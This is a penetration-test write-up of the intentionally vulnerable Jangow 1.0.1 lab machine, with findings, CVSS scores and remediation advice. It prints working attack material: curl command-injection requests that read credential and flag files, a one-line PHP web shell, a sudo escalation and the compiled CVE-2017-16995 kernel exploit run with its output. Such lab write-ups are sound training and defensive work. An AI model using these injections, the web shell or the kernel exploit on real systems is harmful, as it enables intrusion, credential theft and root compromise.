# Jangow 1.0.1 — VAPT Report

**Vulnerability Assessment & Penetration Testing (VAPT) report on the intentionally vulnerable Jangow 1.0.1 machine from VulnHub.**

> Educational CTF lab assessment. All testing was done in an isolated local lab (VirtualBox, Host-only network) against an intentionally vulnerable VM. No real systems were targeted. Flags and passwords are redacted so other learners can enjoy the challenge.

| Item | Detail |
|------|--------|
| Project | CTF Lab — VulnHub Jangow 1.0.1 |
| Assessment date | October 2026 |
| Prepared by | Naeem Islam |
| Certification | CIT ES CEH 2601 |
| Report version | 1.0 — Final |
| Contact | [LinkedIn](https://linkedin.com/in/naeem-islam-ab1a46444) |

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Introduction](#2-introduction)
3. [Target Information](#3-target-information)
4. [Reconnaissance & Enumeration](#4-reconnaissance--enumeration)
5. [Vulnerability Analysis](#5-vulnerability-analysis)
6. [Exploitation / Proof of Concept](#6-exploitation--proof-of-concept)
7. [Risk Assessment](#7-risk-assessment)
8. [Recommendations](#8-recommendations)
9. [Conclusion](#9-conclusion)
10. [Appendix](#10-appendix)

---

## 1. Executive Summary

This report presents the results of a penetration test conducted against the Jangow 1.0.1 intentionally vulnerable virtual machine, sourced from VulnHub. The engagement followed a standard phased methodology consistent with PTES (Penetration Testing Execution Standard): Reconnaissance, Enumeration, Vulnerability Analysis, Exploitation, and Reporting.

Full root-level compromise was achieved via two independent methods: credential re-use enabling immediate `sudo` privilege escalation, and a kernel-level local privilege escalation exploit targeting CVE-2017-16995. Both the user flag and the root proof flag were captured.

### Key Observations

- A critical **OS Command Injection** vulnerability was identified at `site/busque.php?buscar=`. User input is passed directly to PHP's `system()` function with no sanitisation.
- **Plaintext database credentials** were found in a web-accessible PHP configuration file (`wordpress/config.php`), readable via the command injection vulnerability.
- The recovered password was **reused** across database, FTP, and sudo accounts. A single credential leak led directly to root access.
- The target kernel (Linux 4.4.0-31-generic) is vulnerable to a known local privilege escalation (**CVE-2017-16995**), providing a second independent root path.
- The FTP service (vsftpd 3.0.3) was accessible with the same leaked credentials, providing an additional authenticated entry point.

### Overall Risk Posture

**Critical.** A single unvalidated web input led to complete system compromise via a well-defined, multi-step attack chain requiring no advanced techniques.

| Environment tested | Overview | Status |
|--------------------|----------|--------|
| 192.168.56.118 (Jangow VM) | Intentionally vulnerable CTF machine (VulnHub) | Fully compromised |
| Port 80 — HTTP (Apache 2.4.18) | Web application, OS command injection entry point | Critical — Exploited |
| Port 21 — FTP (vsftpd 3.0.3) | FTP service, credential access confirmed | Medium — Exploited |
| Linux kernel 4.4.0-31 | Local privilege escalation via CVE-2017-16995 | Critical — Exploited |

---

## 2. Introduction

### 2.1 Objective

Evaluate the security posture of the Jangow 1.0.1 virtual machine by performing a **black-box penetration test**: identify and exploit vulnerabilities to achieve the highest level of privilege (root / uid=0) and capture all available proof flags.

### 2.2 Scope

| Item | Detail |
|------|--------|
| Target | Jangow 1.0.1 — VulnHub CTF machine |
| IP address | 192.168.56.118 (VirtualBox Host-only network) |
| In scope | All TCP ports discovered; web application on port 80; FTP on port 21 |
| Out of scope | Any production system; any host outside the lab network; denial-of-service testing |

### 2.3 Methodology

Testing followed PTES and the OWASP Testing Guide:

- **Planning:** engagement objectives confirmed; lab environment isolated.
- **Reconnaissance:** network discovery, host identification, service fingerprinting.
- **Enumeration:** port/service scanning, web directory enumeration, source code review.
- **Vulnerability analysis:** correlation of enumerated data against known vulnerability classes.
- **Exploitation:** controlled, non-destructive exploitation of identified vulnerabilities.
- **Post-exploitation:** credential recovery, privilege escalation, flag capture.
- **Reporting:** documentation of findings, evidence, CVSS scores, and remediation guidance.

### 2.4 Assumptions & Limitations

- Testing was performed against a known-vulnerable CTF training machine; findings illustrate common real-world vulnerability classes.
- No denial-of-service or destructive actions were performed.
- The VM was accessed via the VirtualBox console for user-level login; all exploitation was performed from the Kali attacker VM (192.168.56.101).
- CVSS scores are estimates based on vulnerability characteristics and confirmed impact; official scores may differ.

---

## 3. Target Information

| Item | Detail |
|------|--------|
| Target | Jangow 1.0.1 (VulnHub) |
| IP address | 192.168.56.118 |
| Attacker IP | 192.168.56.101 (Kali Linux 2026.2 x64) |
| Operating system | Ubuntu 16.04.1 LTS |
| Kernel version | Linux 4.4.0-31-generic x86_64 |
| Web server | Apache httpd 2.4.18 (Ubuntu) |
| FTP server | vsftpd 3.0.3 |
| PHP version | Identified via source code review |
| Network setup | VirtualBox Host-only Adapter (192.168.56.0/24) |
| Assessment type | Black-box penetration test |
| System user obtained | jangow01 (uid=1000) |
| Final result | **Full root compromise — uid=0(root) — both flags captured** |

---

## 4. Reconnaissance & Enumeration

### 4.1 Network Discovery & Host Connectivity

Both virtual machines were configured with a VirtualBox Host-only Adapter on the same subnet (192.168.56.0/24). The Jangow VM displayed its assigned IP address (**192.168.56.118**) at the login prompt on boot. Connectivity was confirmed with an ICMP ping test, which returned 0% packet loss from the attacker machine (192.168.56.101).

### 4.2 Port & Service Enumeration (Nmap)

A TCP port scan with version detection and default scripts was run against the target:

```bash
nmap -sC -sV 192.168.56.118
```

| Port | State | Service | Version | Risk level |
|------|-------|---------|---------|------------|
| 21/tcp | Open | FTP | vsftpd 3.0.3 | Medium |
| 80/tcp | Open | HTTP | Apache httpd 2.4.18 (Ubuntu) | Critical |
| All others | Filtered | — | No response | — |

### 4.3 Web Application Enumeration

Browsing to `http://192.168.56.118/site/` revealed a Bootstrap "Grayscale" themed single-page web application. The navigation menu contained a "Buscar" link pointing to `busque.php?buscar=`, a search endpoint. Source code review revealed the critical vulnerability:

```php
<?php system($_GET['buscar']); ?>
```

The `buscar` GET parameter is passed directly to PHP's `system()` function with no input validation, sanitisation, or escaping, a textbook critical OS command injection. Additional files discovered in the web root:

| File / path | Description | Sensitivity |
|-------------|-------------|-------------|
| `site/busque.php` | PHP command injection entry point | Critical |
| `site/shell.php` | Web shell (`<?php system($_GET["c"]);?>`), left from a prior session | Critical |
| `site/wordpress/config.php` | Database configuration with plaintext credentials | Critical |
| `site/wordpress/index.html` | Static placeholder page | Low |

### 4.4 Enumerated Data Summary

Enumeration confirmed a Linux target (Ubuntu 16.04, kernel 4.4.0-31) running an Apache 2.4.18 web server with a critically vulnerable PHP search page. The web directory also contained a pre-existing web shell and a database configuration file with plaintext credentials. The home directory of user `jangow01` contained compiled exploit binaries from prior attempts. The breadth of exposed attack surface (injection, credentials, outdated kernel) resulted in full root compromise.

---

## 5. Vulnerability Analysis

| ID | Port | Service | Vulnerability | Reference | Severity |
|----|------|---------|---------------|-----------|----------|
| V-01 | 80/tcp | HTTP / PHP | OS Command Injection: `busque.php` passes GET param to `system()` unsanitised | CWE-78 | Critical |
| V-02 | 80/tcp | HTTP / PHP | Plaintext credentials exposed in web-accessible `config.php` | CWE-312 | Critical |
| V-03 | System | Linux / sudo | Credential re-use: DB password accepted by sudo, immediate root | CWE-521 | Critical |
| V-04 | Kernel | Linux 4.4.0-31 | Local privilege escalation, eBPF double-`fdput()` | CVE-2017-16995 | Critical |
| V-05 | 21/tcp | FTP (vsftpd) | FTP exposed with same credentials as system user | CWE-308 | Medium |
| V-06 | 80/tcp | HTTP / PHP | Pre-existing unrestricted web shell (`site/shell.php`) | — | Critical |

---

## 6. Exploitation / Proof of Concept

All exploitation was performed safely and non-destructively in the isolated lab. Commands were limited to identity confirmation (`id`, `whoami`), file reading (`cat`), and directory listing (`ls`). No data was modified or deleted.

### 6.1 V-01 — OS Command Injection (`busque.php`)

- **Location:** `http://192.168.56.118/site/busque.php?buscar=`
- **CVSS 3.1 (estimate):** 9.8 (Critical) — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

Any value supplied is executed as an OS command in the context of the web server user (`www-data`). Exploitation was confirmed by injecting the `id` command:

```bash
$ curl "http://192.168.56.118/site/busque.php?buscar=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ curl "http://192.168.56.118/site/busque.php?buscar=ls+/home/jangow01"
dirty dirty.c jangow jangow.c out.log user.txt
```

**Impact:** Full OS command execution as `www-data`; arbitrary file read; reconnaissance of the entire filesystem; basis for further attack chain stages.

### 6.2 V-02 — Plaintext Credentials in Config File

- **Location:** `http://192.168.56.118/site/wordpress/config.php`
- **CVSS 3.1 (estimate):** 9.1 (Critical) — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

The command injection from V-01 was used to read the WordPress database configuration file, exposing plaintext credentials:

```bash
$ curl "http://192.168.56.118/site/busque.php?buscar=cat+/var/www/html/site/wordpress/config.php"

<?php
  $servername = "localhost";
  $database   = "desafio02";
  $username   = "desafio02";
  $password   = "[REDACTED]";   // <-- plaintext credential
?>
```

The user flag was then retrieved through the same injection:

```bash
$ curl "http://192.168.56.118/site/busque.php?buscar=cat+/home/jangow01/user.txt"
[REDACTED — flag hidden for public release]
```

**Impact:** The recovered credentials for `jangow01` were used for FTP login and VM console access, enabling all subsequent exploitation stages.

### 6.3 V-03 — Credential Re-use / Sudo Privilege Escalation

- **Location:** VM console, `jangow01@jangow01`
- **CVSS 3.1 (estimate):** 8.8 (High) — `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`

After logging into the VM console as `jangow01` with the recovered password, the home directory contained a `.sudo_as_admin_successful` marker file, indicating the user holds sudo privileges. The same leaked password was accepted by `sudo`, granting immediate root access:

```bash
jangow01@jangow01:~$ sudo su
[sudo] password for jangow01: [REDACTED]

root@jangow01:/home/jangow01# id
uid=0(root) gid=0(root) groups=0(root)

root@jangow01:/home/jangow01# cat /root/proof.txt
[REDACTED — flag hidden for public release]
```

**Impact:** Full root compromise achieved.

### 6.4 V-04 — Kernel Exploit CVE-2017-16995 (Local Privilege Escalation)

- **CVE:** CVE-2017-16995 (Exploit-DB 45010)
- **CVSS 3.1 (NVD):** 7.8 (High) — `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`

The target kernel **Linux 4.4.0-31-generic** is vulnerable to CVE-2017-16995, an eBPF double-`fdput()` local privilege escalation. The exploit source (Exploit-DB 45010) was present on the target from a prior session and was compiled and executed:

```bash
jangow01@jangow01:~$ gcc jangow.c -o jangow
jangow01@jangow01:~$ ./jangow

[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff88003586be00
[*] credentials patched, launching shell...

# id
uid=0(root) gid=0(root) groups=0(root)
```

**Impact:** Full root compromise achieved via an independent kernel-level attack path, confirming two separate routes to uid=0.

---

## 7. Risk Assessment

### 7.1 Severity Rating Scale

| Severity | CVSS range | Description |
|----------|------------|-------------|
| Critical | 9.0 – 10.0 | Exploitable remotely/locally with no authentication; full system compromise likely |
| High | 7.0 – 8.9 | Significant impact; may require local access or low privileges |
| Medium | 4.0 – 6.9 | Moderate impact; often requires some conditions or interaction |
| Low | 0.1 – 3.9 | Minimal direct impact; requires significant conditions |
| Informational | 0.0 | Best-practice deviation or configuration observation |

### 7.2 Consolidated Risk Summary

| ID | Vulnerability | CVSS | Severity | Status |
|----|---------------|------|----------|--------|
| V-01 | OS Command Injection — `busque.php` | 9.8 | Critical | Confirmed & exploited |
| V-02 | Plaintext credentials in config file | 9.1 | Critical | Confirmed & exploited |
| V-03 | Credential re-use / sudo escalation | 8.8 | High | Confirmed & exploited |
| V-04 | Kernel exploit CVE-2017-16995 | 7.8 | High | Confirmed & exploited |
| V-05 | FTP service with system credentials | 5.4 | Medium | Confirmed |
| V-06 | Pre-existing unrestricted web shell | 9.8 | Critical | Identified |

---

## 8. Recommendations

### 8.1 Critical / High Priority

**V-01 — OS Command Injection**
- Never pass unsanitised user input to `system()`, `exec()`, `shell_exec()`, or `passthru()`.
- Use `escapeshellarg()` to escape any user input that must be passed to shell commands.
- Implement a whitelist of permitted inputs; reject anything that does not match.
- Apply a Web Application Firewall (WAF) as a defence-in-depth layer.

**V-02 — Plaintext Credentials**
- Store all credentials outside the web root; use environment variables or a secrets manager.
- Set restrictive file permissions (`chmod 600`) on all configuration files.
- Rotate any exposed credentials immediately and audit all systems where they may have been used.

**V-03 — Credential Re-use / Sudo**
- Enforce a unique password policy; no credential may be shared across database, FTP, and system sudo.
- Apply the principle of least privilege: system users should not have sudo rights unless essential.
- Use command-specific sudo rules rather than blanket `ALL=(ALL:ALL) ALL` access.

**V-04 — Outdated Kernel (CVE-2017-16995)**
- Upgrade Ubuntu 16.04 (EOL April 2021) to a currently supported LTS release (22.04 or 24.04).
- Apply all available kernel security patches; establish a regular patching cadence.
- Enable automatic security updates (`unattended-upgrades`) for critical kernel patches.

### 8.2 Medium Priority

**V-05 — FTP Service**
- Disable FTP; replace it with SFTP or SCP, which encrypt credentials and data in transit.
- If FTP must remain, restrict access by IP, enforce TLS (FTPS), and use dedicated FTP credentials.
- Implement account lockout after repeated failed login attempts.

**V-06 — Unrestricted Web Shell**
- Audit the web root for any files not belonging to the application (`shell.php` must be removed).
- Implement file integrity monitoring (FIM) to detect unauthorised file creation.
- Restrict web server write access to directories where uploads/scripts are not expected.

---

## 9. Conclusion

### Summary of Findings

| # | Finding | Severity | Exploited |
|---|---------|----------|-----------|
| V-01 | OS Command Injection (`busque.php`) | Critical | Yes |
| V-02 | Plaintext credentials in config file | Critical | Yes |
| V-03 | Credential re-use / sudo privilege escalation | High | Yes |
| V-04 | CVE-2017-16995 kernel local privilege escalation | High | Yes |
| V-05 | FTP service with system credentials | Medium | Yes |
| V-06 | Pre-existing unrestricted web shell | Critical | Identified |

### Overall Security Posture

The Jangow 1.0.1 machine presents a **Critical** overall security posture. A single unauthenticated web request to the command injection endpoint was enough to start a complete attack chain: remote code execution as `www-data`, credential theft, and full root compromise. No advanced techniques and no authentication were needed at any stage.

The chain **Injection → Credential Exposure → Re-use → Root** is one of the most common patterns in real-world breaches. It shows why input validation, secrets management, credential hygiene, kernel patching, and least privilege are non-negotiable security fundamentals.

### Next Steps

- Remediate V-01 through V-04 as critical priority before exposing equivalent systems.
- Conduct a full credential audit and rotate all potentially compromised passwords.
- Implement web application security testing as part of the software development lifecycle.
- Establish a vulnerability management programme with defined SLAs for critical patches.

**User flag** (`/home/jangow01/user.txt`): `[REDACTED]`
**Root flag** (`/root/proof.txt`): `[REDACTED]`

---

## 10. Appendix

### Tool List

| Tool | Version | Purpose |
|------|---------|---------|
| Nmap | 7.99 | Network discovery, port/version scanning |
| curl | System default | HTTP request crafting, command injection testing |
| Firefox | Kali browser | Web application exploration and injection testing |
| ftp (client) | System default | FTP authentication testing |
| gcc | 5.4.0 | Compilation of the CVE-2017-16995 exploit source |
| VirtualBox | 7.x | VM hosting and Host-only network isolation |
| Kali Linux | 2026.2 x64 | Attacker operating system |

---

## Disclaimer

This report was prepared solely for educational and skill-development purposes in a controlled CTF lab environment. No warranties, express or implied, are given with respect to its accuracy or completeness. It is provided "as is".

## Author

**Naeem Islam** — CIT ES CEH 2601 — [LinkedIn](https://linkedin.com/in/naeem-islam-ab1a46444)